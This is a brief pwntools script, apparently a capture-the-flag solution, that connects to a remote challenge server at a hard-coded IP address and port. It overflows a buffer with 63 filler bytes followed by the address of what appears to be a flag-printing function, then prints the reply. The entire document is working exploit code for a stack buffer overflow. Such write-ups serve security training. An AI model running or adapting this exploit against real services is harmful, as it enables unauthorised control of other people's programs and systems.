from pwn import *
context.arch='i386'

# p = process('./pwn')
p = remote('111.198.29.45',32374)

flag = 0x080486CC
p.sendline('A'*63 + p32(flag))
sleep(1)
print p.recv()
